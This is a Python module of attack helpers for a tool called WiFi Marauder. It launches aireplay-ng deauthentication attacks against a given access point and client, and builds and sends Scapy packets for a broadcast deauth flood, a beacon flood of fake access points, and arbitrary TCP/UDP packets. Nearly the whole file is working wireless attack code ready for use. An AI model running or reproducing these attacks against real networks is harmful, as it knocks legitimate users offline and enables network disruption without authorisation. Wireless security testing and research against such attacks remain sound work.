"""
Attack logic helpers for WiFi Marauder.
"""
import subprocess
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Elt, IP, TCP, UDP, Raw, sendp
except ImportError:
    RadioTap = Dot11 = Dot11Deauth = Dot11Elt = IP = TCP = UDP = Raw = sendp = None

def build_deauth_cmd(interface, bssid, client, count):
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(interface)
    return cmd

def start_deauth(interface, bssid, client='', count=5):
    """Start deauth attack and return Popen handle."""
    cmd = build_deauth_cmd(interface, bssid, client, count)
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def stop_attack(process):
    """Terminate given subprocess."""
    if process and process.poll() is None:
        process.terminate()
        process.wait(timeout=5)
    return True

def build_packet(ptype, target, param=None):
    """Return a Scapy packet based on type, target, and param."""
    if not RadioTap:
        raise RuntimeError("Scapy not available")
    if ptype == "Deauth Flood":
        return RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target)/Dot11Deauth(reason=7)
    elif ptype == "Beacon Flood":
        ssid = target or "FakeAP"
        ch = int(param) if param and param.isdigit() else 1
        pkt = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
        pkt /= Dot11Elt(ID="SSID", info=ssid)
        pkt /= Dot11Elt(ID="DSset", info=bytes([ch]))
        return pkt
    elif ptype in ("Custom TCP", "Custom UDP"):
        ip_dst = target
        port = int(param) if param and param.isdigit() else 80
        if ptype == "Custom TCP":
            return IP(dst=ip_dst)/TCP(dport=port)/Raw(load=b"Hello")
        else:
            return IP(dst=ip_dst)/UDP(dport=port)/Raw(load=b"Hello")
    else:
        raise ValueError(f"Unknown packet type: {ptype}")

def send_packet(pkt, interface):
    """Send a Scapy packet on given interface."""
    if not sendp:
        raise RuntimeError("Scapy sendp not available")
    return sendp(pkt, iface=interface, count=1)